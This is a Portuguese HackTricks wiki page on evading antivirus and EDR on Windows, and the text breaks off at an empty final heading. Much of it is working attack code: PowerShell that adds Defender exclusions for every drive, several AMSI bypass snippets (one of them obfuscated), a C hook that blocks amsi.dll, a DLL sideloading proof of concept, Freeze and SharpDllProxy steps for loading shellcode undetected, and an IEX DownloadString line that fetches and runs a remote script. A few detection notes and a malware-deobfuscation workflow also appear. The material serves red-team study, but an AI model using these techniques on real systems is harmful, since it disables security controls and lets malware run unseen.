# Bypass de antivírus (AV)

{{#include ../banners/hacktricks-training.md}}

**Esta página foi escrita inicialmente por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uma ferramenta para impedir o funcionamento do Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uma ferramenta para impedir o funcionamento do Windows Defender, fingindo ser outro antivírus.
- [Desativar o Defender se você for administrador](basic-powershell-for-pentesters/README.md)

### Isca de UAC no estilo de instalador antes de adulterar o Defender

Loaders públicos disfarçados de cheats de jogos são frequentemente distribuídos como instaladores Node.js/Nexe sem assinatura que primeiro **pedem elevação ao usuário** e só então desativam o Defender. O fluxo é simples:

1. Verifique se há contexto administrativo com `net session`. O comando só é executado com sucesso quando quem o executa tem direitos de administrador, então uma falha indica que o loader está sendo executado como usuário padrão.
2. Reinicie-se imediatamente com o verbo `RunAs` para acionar o esperado prompt de consentimento do UAC, preservando a linha de comando original.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

As vítimas já acreditam que estão instalando software “crackeado”, então geralmente aceitam o prompt, concedendo ao malware as permissões necessárias para alterar a política do Defender.<sup>[[26]](#references)</sup>

### Exclusões abrangentes de `MpPreference` para cada letra de unidade

Depois de obter privilégios elevados, cadeias no estilo GachiLoader maximizam os pontos cegos do Defender em vez de desativar o serviço por completo. Primeiro, o loader encerra o watchdog da GUI (`taskkill /F /IM SecHealthUI.exe`) e, em seguida, adiciona **exclusões extremamente abrangentes**, tornando impossível escanear todos os perfis de usuário, diretórios do sistema e discos removíveis:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Observações importantes:

- O loop percorre todos os sistemas de arquivos montados (D:\, E:\, pendrives USB etc.), então **qualquer payload futuro salvo em qualquer lugar do disco será ignorado**.
- A exclusão da extensão `.sys` é preventiva: os atacantes reservam a opção de carregar drivers não assinados mais tarde sem precisar mexer novamente no Defender.
- Todas as alterações ficam em `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permitindo que etapas posteriores confirmem que as exclusões persistem ou as ampliem sem acionar novamente o UAC.

Como nenhum serviço do Defender é interrompido, verificações de integridade ingênuas continuam indicando que o “antivírus está ativo”, embora a inspeção em tempo real nunca examine esses caminhos.<sup>[[26]](#references)</sup>

## **Metodologia de AV Evasion**

Atualmente, os AVs usam métodos diferentes para verificar se um arquivo é malicioso ou não: detecção estática, análise dinâmica e, no caso dos EDRs mais avançados, análise comportamental.

### **Detecção estática**

A detecção estática é feita identificando strings maliciosas conhecidas ou sequências de bytes em um binário ou script, além de extrair informações do próprio arquivo (por exemplo, descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum etc.). Isso significa que usar ferramentas públicas conhecidas pode fazer com que você seja detectado com mais facilidade, pois elas provavelmente já foram analisadas e sinalizadas como maliciosas. Há algumas maneiras de contornar esse tipo de detecção:

- **Criptografia**

Se você criptografar o binário, o AV não terá como detectar seu programa, mas será necessário algum tipo de loader para descriptografar e executar o programa na memória.

- **Ofuscação**

Às vezes, basta alterar algumas strings no binário ou script para passar pelo AV, mas isso pode consumir bastante tempo, dependendo do que você está tentando ofuscar.

- **Ferramentas personalizadas**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas maliciosas conhecidas, mas isso exige muito tempo e esforço.

> [!TIP]
> Uma boa maneira de verificar a detecção estática do Windows Defender é usar [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ele divide o arquivo em vários segmentos e pede ao Defender para verificar cada um individualmente. Assim, pode indicar exatamente quais strings ou bytes do binário foram sinalizados.

Recomendo muito que confira esta [playlist do YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion na prática.

### **Análise dinâmica**

A análise dinâmica ocorre quando o AV executa seu binário em uma sandbox e monitora atividades maliciosas (por exemplo, tentar descriptografar e ler as senhas do navegador, realizar um minidump do LSASS etc.). Essa parte pode ser um pouco mais complicada, mas há algumas coisas que você pode fazer para evitar sandboxes.

- **Aguardar antes da execução** Dependendo da implementação, essa pode ser uma ótima maneira de contornar a análise dinâmica do AV. Os AVs têm pouquíssimo tempo para verificar arquivos, para não interromper o fluxo de trabalho do usuário; portanto, pausas longas podem atrapalhar a análise dos binários. O problema é que muitas sandboxes de AV podem simplesmente ignorar a pausa, dependendo de como ela foi implementada.
- **Verificar os recursos da máquina** Normalmente, as sandboxes têm poucos recursos disponíveis (por exemplo, < 2GB de RAM); caso contrário, poderiam deixar a máquina do usuário lenta. Você também pode ser bastante criativo: por exemplo, verificando a temperatura da CPU ou até a velocidade das ventoinhas. Nem tudo será implementado na sandbox.
- **Verificações específicas da máquina** Se quiser atingir um usuário cuja estação de trabalho esteja ingressada no domínio "contoso.local", você pode verificar o domínio do computador para ver se corresponde ao que especificou. Se não corresponder, pode encerrar o programa.

Acontece que o nome do computador da sandbox do Microsoft Defender é HAL9TH. Portanto, você pode verificar o nome do computador no malware antes da detonação. Se o nome for HAL9TH, significa que você está dentro da sandbox do Defender, então pode encerrar o programa.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Outras ótimas dicas de [@mgeeky](https://twitter.com/mariuszbit) para lidar com sandboxes:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como já dissemos neste post, **ferramentas públicas** acabarão sendo **detectadas**. Portanto, você deve se perguntar:

Por exemplo, se quiser fazer dump do LSASS, **você realmente precisa usar o mimikatz**? Ou poderia usar outro projeto menos conhecido que também faz dump do LSASS?

A resposta certa provavelmente é a segunda opção. O mimikatz, por exemplo, é provavelmente uma das ferramentas — se não a ferramenta — mais sinalizadas por AVs e EDRs. Embora o projeto em si seja muito bom, é um pesadelo contornar AVs com ele; portanto, procure alternativas para o que está tentando fazer.

> [!TIP]
> Ao modificar seus payloads para evitar a detecção, **desative o envio automático de amostras** no Defender e, por favor, **NÃO ENVIE PARA O VIRUSTOTAL** se seu objetivo for evitar a detecção a longo prazo. Se quiser verificar se um AV específico detecta seu payload, instale-o em uma VM, tente desativar o envio automático de amostras e faça os testes nela até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, **priorize o uso de DLLs para evadir detecção**. Na minha experiência, arquivos DLL costumam ser **muito menos detectados** e analisados; portanto, esse é um truque simples para evitar a detecção em alguns casos (se o seu payload puder ser executado como DLL, é claro).

Como podemos ver nesta imagem, um payload DLL do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem uma taxa de detecção de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparação no antiscan.me entre um payload EXE normal do Havoc e uma DLL normal do Havoc</p></figcaption></figure>

Agora mostraremos alguns truques que você pode usar com arquivos DLL para ser muito mais furtivo.

## DLL Sideloading & Proxying

**DLL Sideloading** aproveita a ordem de busca de DLL usada pelo loader, posicionando o aplicativo vítima e os payloads maliciosos lado a lado.

Você pode procurar programas suscetíveis a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte script de PowerShell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Este comando exibirá a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Recomendo muito que **explore por conta própria programas suscetíveis a DLL Hijack/Sideload**. Quando executada corretamente, essa técnica é bastante furtiva, mas, se você usar programas DLL Sideloadable conhecidos publicamente, poderá ser detectado com facilidade.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não fará com que seu payload seja carregado, pois o programa espera encontrar funções específicas nessa DLL. Para resolver esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (e maliciosa) para a DLL original, preservando assim a funcionalidade do programa e permitindo executar seu payload.

Vou usar o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/flangvik/).

Estas são as etapas que segui:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

O último comando nos fornecerá 2 arquivos: um modelo de código-fonte de DLL e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Estes são os resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto a proxy DLL têm uma taxa de detecção de 0/26 no [antiscan.me](https://antiscan.me)! Eu diria que foi um sucesso.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Recomendo **muito** que você assista ao [VOD da S3cur3Th1sSh1t na Twitch](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também ao [vídeo do ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender mais sobre o que discutimos, com mais detalhes.

### Abuso de exports encaminhados (ForwardSideLoading)

Módulos PE do Windows podem exportar funções que são, na verdade, "forwarders": em vez de apontar para código, a entrada de export contém uma string ASCII no formato `TargetDll.TargetFunc`. Quando um chamador resolve o export, o carregador do Windows:

- Carrega `TargetDll` se ainda não estiver carregada
- Resolve `TargetFunc` a partir dela

Comportamentos importantes a entender:
- Se `TargetDll` for uma KnownDLL, ela será fornecida pelo namespace protegido KnownDLLs (por exemplo, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` não for uma KnownDLL, será usada a ordem normal de pesquisa de DLLs, que inclui o diretório do módulo que está realizando a resolução do forward.

Isso possibilita uma primitiva indireta de sideloading: encontre uma DLL assinada que exporte uma função encaminhada para um módulo que não seja KnownDLL, então coloque essa DLL assinada no mesmo diretório que uma DLL controlada pelo atacante com o nome exato do módulo de destino encaminhado. Quando o export encaminhado for chamado, o carregador resolve o forward e carrega sua DLL a partir do mesmo diretório, executando seu DllMain.<sup>[[13]](#references)</sup>

Exemplo observado no Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` não é uma KnownDLL, portanto é resolvida pela ordem de pesquisa normal.

PoC (copiar e colar):
1) Copie a DLL de sistema assinada para uma pasta gravável.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloque uma `NCRYPTPROV.dll` maliciosa na mesma pasta. Um `DllMain` mínimo é suficiente para executar código; não é necessário implementar a função encaminhada para acionar o `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Acione o forward com um LOLBin assinado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Comportamento observado:
- rundll32 (assinado) carrega a `keyiso.dll` side-by-side (assinada)
- Ao resolver `KeyIsoSetAuditingInterface`, o loader segue o encaminhamento para `NCRYPTPROV.SetAuditingInterface`
- Em seguida, o loader carrega `NCRYPTPROV.dll` de `C:\test` e executa seu `DllMain`
- Se `SetAuditingInterface` não estiver implementada, você receberá um erro de "missing API" somente depois que `DllMain` já tiver sido executado

Dicas de hunting:
- Foque em exports encaminhadas cujo módulo de destino não seja um KnownDLL. Os KnownDLLs estão listados em `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Você pode enumerar exports encaminhadas com ferramentas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulte o inventário de forwarders do Windows 11 para procurar candidatos: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideias de detecção/defesa:
- Monitore LOLBins (por exemplo, rundll32.exe) carregando DLLs assinadas de caminhos que não sejam do sistema, seguidas pelo carregamento de DLLs que não sejam KnownDLLs com o mesmo nome base desse diretório
- Gere alertas para cadeias de processos/módulos como: `rundll32.exe` → `keyiso.dll` fora do sistema → `NCRYPTPROV.dll` em caminhos graváveis pelo usuário
- Aplique políticas de integridade de código (WDAC/AppLocker) e negue permissões de gravação e execução nos diretórios de aplicativos

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Você pode usar o Freeze para carregar e executar seu shellcode de forma furtiva.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion é apenas um jogo de gato e rato: o que funciona hoje pode ser detectado amanhã, então nunca confie em apenas uma ferramenta; se possível, tente encadear várias técnicas de evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Os EDRs costumam instalar **hooks inline em user-mode** nos stubs de syscall de `ntdll.dll`. Para contornar esses hooks, você pode gerar stubs de syscall **direct** ou **indirect** que carregam o **SSN** (System Service Number) correto e fazem a transição para o modo kernel sem executar o entrypoint exportado que contém o hook.<sup>[[32]](#references)</sup>

**Opções de invocação:**
- **Direct (embedded)**: emite uma instrução `syscall`/`sysenter`/`SVC #0` no stub gerado (sem acessar uma exportação de `ntdll`).
- **Indirect**: salta para um gadget `syscall` existente em `ntdll`, fazendo com que a transição para o kernel pareça ter origem em `ntdll` (útil para evasion heurística); **randomized indirect** escolhe um gadget de um conjunto para cada chamada.
- **Egg-hunt**: evita incorporar a sequência estática de opcode `0F 05` em disco; resolve uma sequência de syscall em tempo de execução.

**Estratégias de resolução de SSN resistentes a hooks:**
- **FreshyCalls (VA sort)**: infere SSNs ordenando os stubs de syscall por endereço virtual, em vez de ler os bytes dos stubs.
- **SyscallsFromDisk**: mapeia um `\KnownDlls\ntdll.dll` limpo, lê os SSNs de seu `.text` e, em seguida, remove o mapeamento (contorna todos os hooks na memória).
- **RecycledGate**: combina a inferência de SSN por ordenação de VA com a validação de opcode quando um stub está limpo; recorre à inferência por VA se houver um hook.
- **HW Breakpoint**: define DR0 na instrução `syscall` e usa um VEH para capturar o SSN de `EAX` em tempo de execução, sem analisar bytes que possam conter hooks.

Exemplo de uso do SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

O AMSI foi criado para impedir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os AVs só eram capazes de verificar **arquivos em disco**. Portanto, se você conseguisse executar payloads **diretamente na memória**, o AV não poderia fazer nada para impedir isso, pois não teria visibilidade suficiente.

O recurso AMSI está integrado nestes componentes do Windows.

- Controle de Conta de Usuário, ou UAC (elevação de EXE, COM, MSI ou instalação de ActiveX)
- PowerShell (scripts, uso interativo e avaliação dinâmica de código)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macros VBA do Office

Ele permite que soluções antivírus inspecionem o comportamento dos scripts expondo o conteúdo dos scripts em um formato não criptografado e não ofuscado.

A execução de `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produzirá o seguinte alerta no Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observe como ele adiciona `amsi:` e, em seguida, o caminho para o executável a partir do qual o script foi executado; neste caso, powershell.exe

Não gravamos nenhum arquivo em disco, mas ainda assim fomos detectados na memória por causa do AMSI.

Além disso, a partir do **.NET 4.8**, o código C# também é executado pelo AMSI. Isso afeta até mesmo `Assembly.Load(byte[])`, usado para carregar código que será executado na memória. Por isso, recomenda-se usar versões anteriores do .NET (como a 4.7.2 ou inferior) para execução na memória, caso você queira evitar o AMSI.

Há algumas maneiras de contornar o AMSI:

- **Ofuscação**

Como o AMSI funciona principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa maneira de evitar a detecção.

No entanto, o AMSI consegue desfazer a ofuscação de scripts mesmo quando há várias camadas, então a ofuscação pode ser uma má opção, dependendo de como é feita. Isso torna a evasão pouco simples. Porém, às vezes, basta alterar alguns nomes de variáveis para resolver o problema, então isso depende do quanto algo foi sinalizado.

- **AMSI Bypass**

Como o AMSI é implementado carregando uma DLL no processo do powershell (também cscript.exe, wscript.exe etc.), é possível adulterá-lo facilmente, mesmo executando como um usuário sem privilégios. Devido a essa falha na implementação do AMSI, pesquisadores encontraram várias maneiras de evitar a verificação do AMSI.

**Forçar um erro**

Forçar a falha na inicialização do AMSI (amsiInitFailed) fará com que nenhuma verificação seja iniciada para o processo atual. Isso foi divulgado originalmente por [Matt Graeber](https://twitter.com/mattifestation), e a Microsoft desenvolveu uma assinatura para impedir o uso generalizado.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Bastou uma linha de código PowerShell para tornar o AMSI inutilizável no processo PowerShell atual. Essa linha, é claro, foi sinalizada pelo próprio AMSI, então é necessário modificá-la para usar essa técnica.

Aqui está um bypass de AMSI modificado que obtive deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep em mente que isso provavelmente será sinalizado assim que esta publicação for lançada, então você não deve publicar nenhum código se seu plano é permanecer indetectado.

**Memory Patching**

Esta técnica foi descoberta inicialmente por [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste em encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por analisar a entrada fornecida pelo usuário) e sobrescrevê-la com instruções para retornar o código de E_INVALIDARG. Dessa forma, o resultado da análise real será 0, que é interpretado como um resultado limpo.

> [!TIP]
> Leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para obter uma explicação mais detalhada.

Há também muitas outras técnicas usadas para contornar o AMSI com powershell. Confira [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**este repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para saber mais sobre elas.

### Bloqueando o AMSI ao impedir o carregamento de amsi.dll (hook de LdrLoadDll)

O AMSI é inicializado somente depois que `amsi.dll` é carregado no processo atual. Um bypass robusto e independente de linguagem consiste em colocar um hook em modo de usuário em `ntdll!LdrLoadDll` que retorna um erro quando o módulo solicitado é `amsi.dll`. Como resultado, o AMSI nunca é carregado e nenhuma análise é realizada nesse processo.<sup>[[23]](#references)</sup>

Esboço da implementação (pseudocódigo em C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona com PowerShell, WScript/CScript e loaders personalizados (qualquer coisa que, de outra forma, carregaria o AMSI).
- Combine com o envio de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefatos longos na linha de comando.
- Já foi usado por loaders executados por meio de LOLBins (por exemplo, `regsvr32` chamando `DllRegisterServer`).

A ferramenta **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** também gera scripts para bypass do AMSI.
A ferramenta **[https://amsibypass.com/](https://amsibypass.com/)** também gera scripts para bypass do AMSI que evitam assinaturas usando funções e variáveis definidas pelo usuário, expressões com caracteres aleatórios e aplicando variações aleatórias entre maiúsculas e minúsculas às palavras-chave do PowerShell para evitar assinaturas.

**Remova a assinatura detectada**

Você pode usar ferramentas como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover a assinatura do AMSI detectada da memória do processo atual. Essas ferramentas funcionam varrendo a memória do processo atual em busca da assinatura do AMSI e, em seguida, sobrescrevendo-a com instruções NOP, removendo-a efetivamente da memória.

**Produtos AV/EDR que usam AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use a versão 2 do PowerShell**
Se você usar a versão 2 do PowerShell, o AMSI não será carregado, então você poderá executar seus scripts sem que sejam verificados pelo AMSI. Você pode fazer isso:

```bash
powershell.exe -version 2
```

## PS Logging

O logging do PowerShell é um recurso que permite registrar todos os comandos do PowerShell executados em um sistema. Isso pode ser útil para fins de auditoria e solução de problemas, mas também pode ser um **problema para atacantes que querem evitar a detecção**.

Para contornar o logging do PowerShell, você pode usar as seguintes técnicas:

- **Desativar a Transcrição e o Logging de Módulos do PowerShell**: Você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para esse fim.
- **Usar a versão 2 do PowerShell**: Se você usar a versão 2 do PowerShell, o AMSI não será carregado, então você poderá executar seus scripts sem que sejam examinados pelo AMSI. Você pode fazer isso assim: `powershell.exe -version 2`
- **Usar uma sessão de PowerShell não gerenciada**: Use [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para hospedar o PowerShell sem iniciar `powershell.exe` (a abordagem usada pelo `powerpick` do Cobalt Strike). Isso contorna controles vinculados especificamente ao processo `powershell.exe`, mas não desativa por si só o AMSI, o Script Block Logging ou todas as outras defesas do PowerShell; a cobertura depende do runtime e da implementação do host.


## Ofuscação

> [!TIP]
> Várias técnicas de ofuscação dependem da criptografia de dados, o que aumentará a entropia do binário e facilitará sua detecção por AVs e EDRs. Tenha cuidado com isso e talvez aplique a criptografia apenas a seções específicas do seu código que sejam sensíveis ou precisem ser ocultadas.

### Desofuscação de binários .NET protegidos pelo ConfuserEx

Ao analisar malware que usa o ConfuserEx 2 (ou forks comerciais), é comum se deparar com várias camadas de proteção que impedem o funcionamento de decompiladores e sandboxes. O fluxo de trabalho abaixo **restaura um IL quase original** que pode depois ser decompilado para C# em ferramentas como dnSpy ou ILSpy.<sup>[[10]](#references)</sup>

1.  Remoção de anti-tampering – O ConfuserEx criptografa todos os *corpos de métodos* e os descriptografa dentro do construtor estático do *módulo* (`<Module>.cctor`). Ele também altera o checksum do PE, de modo que qualquer modificação causará o travamento do binário. Use o **AntiTamperKiller** para localizar as tabelas de metadados criptografadas, recuperar as chaves XOR e reescrever um assembly limpo:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   A saída contém os 6 parâmetros anti-tamper (`key0-key3`, `nameHash`, `internKey`), que podem ser úteis ao criar seu próprio unpacker.

2.  Recuperação de símbolos / fluxo de controle – forneça o arquivo *clean* ao **de4dot-cex** (um fork do de4dot compatível com ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Sinalizadores:
     • `-p crx` – seleciona o perfil ConfuserEx 2
     • de4dot desfaz o achatamento do fluxo de controle, restaura os namespaces, as classes e os nomes originais das variáveis e descriptografa as strings constantes.

3.  Proxy-call stripping – ConfuserEx substitui chamadas diretas a métodos por wrappers leves (também conhecidos como *proxy calls*) para dificultar ainda mais a decompilação. Remova-os com **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Após esta etapa, você deverá observar APIs .NET comuns, como `Convert.FromBase64String` ou `AES.Create()`, em vez de funções wrapper opacas (`Class8.smethod_10`, …).

4.  Limpeza manual – execute o binário resultante no dnSpy e procure grandes blobs Base64 ou o uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar o *payload* real. Muitas vezes, o malware o armazena como um array de bytes codificado em TLV, inicializado dentro de `<Module>.byte_0`.

A cadeia acima restaura o fluxo de execução **sem** precisar executar a amostra maliciosa — útil ao trabalhar em uma estação de trabalho offline.

> 🛈  ConfuserEx produz um atributo personalizado chamado `ConfusedByAttribute`, que pode ser usado como IOC para fazer a triagem automática de amostras.

#### Comando de uma linha
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscador de C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork de código aberto do conjunto de compilação [LLVM](http://www.llvm.org/) capaz de aumentar a segurança do software por meio de [ofuscação de código](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e proteção contra adulteração.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar código ofuscado em tempo de compilação, sem usar ferramentas externas nem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de operações ofuscadas geradas pelo framework de metaprogramação de templates do C++, o que torna um pouco mais difícil a vida de quem quiser crackear o aplicativo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um ofuscador de binários x64 capaz de ofuscar vários tipos de arquivos PE, incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um mecanismo simples de código metamórfico para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de ofuscação de código granular para linguagens compatíveis com LLVM, que usa ROP (programação orientada a retorno). O ROPfuscator ofusca um programa no nível do código assembly, transformando instruções comuns em cadeias ROP e frustrando nossa concepção natural do fluxo de controle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um crypter de PE .NET escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** O Inceptor pode converter EXE/DLL existentes em shellcode e carregá-los

### Mascaramento próprio por função assistido pelo compilador LLVM

